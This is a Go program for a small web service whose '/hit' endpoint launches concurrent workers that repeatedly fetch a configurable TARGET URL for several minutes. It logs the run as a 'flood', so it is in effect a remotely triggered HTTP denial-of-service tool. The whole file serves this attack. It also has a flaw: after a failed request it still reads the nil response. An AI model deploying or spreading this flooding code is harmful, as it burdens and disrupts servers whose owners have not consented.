package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"slices"
	"sync"
	"time"

	"github.com/joho/godotenv"
)

const numWorkers = 4

var (
	wg        sync.WaitGroup
	transport = &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: runtime.NumCPU() * 2,
		IdleConnTimeout:     90 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   5 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true,
	}
	allowedCodes = []int{http.StatusOK, http.StatusForbidden, http.StatusBadGateway}
	client       = &http.Client{Transport: transport, Timeout: 10 * time.Second}
	limiter      = make(chan struct{}, 1)
)

func Send(wg *sync.WaitGroup, timeout context.Context, client *http.Client, allowedCodes []int) {
	defer wg.Done()

	for {
		select {
		case <-timeout.Done():
			return
		default:
			req, err := http.NewRequestWithContext(timeout, http.MethodGet, os.Getenv("TARGET"), nil)
			if err != nil {
				log.Printf("Could not send the data because: %v\n", err)
				continue
			}

			res, err := client.Do(req)
			if err != nil {
				select {
				case <-timeout.Done():
					return
				default:
				}
				log.Printf("Could not send the request because: %v\n", err)
			}

			if _, err := io.Copy(io.Discard, res.Body); err != nil {
				select {
				case <-timeout.Done():
					return
				default:
				}
				log.Printf("Could not discard the body because: %v\n", err)
				continue
			}

			res.Body.Close()
			if !slices.Contains(allowedCodes, res.StatusCode) {
				return
			}
		}
	}
}

func HandleRequest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	select {
	case limiter <- struct{}{}:
	default:
		w.WriteHeader(http.StatusTooManyRequests)
		w.Write([]byte("The stuff's already running."))
		return
	}

	w.WriteHeader(http.StatusAccepted)
	w.Write([]byte("Got it!"))

	go func() {
		timeout, cancel := context.WithTimeout(context.Background(), 4*time.Minute+30*time.Second)
		defer cancel()
		defer func() { <-limiter }()

		for i := 0; i < numWorkers; i++ {
			wg.Add(1)
			go Send(&wg, timeout, client, allowedCodes)
		}
		wg.Wait()
		log.Println("Done with the flood!")
	}()
}

func HandleIndex(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("All's good!"))
}

func main() {
	_ = godotenv.Load()
	http.HandleFunc("/hit", HandleRequest)
	http.HandleFunc("/", HandleIndex)

	log.Println("Starting server now...")
	if err := http.ListenAndServe(fmt.Sprintf(":%s", os.Getenv("PORT")), nil); err != nil {
		log.Fatalln(err)
	}
}
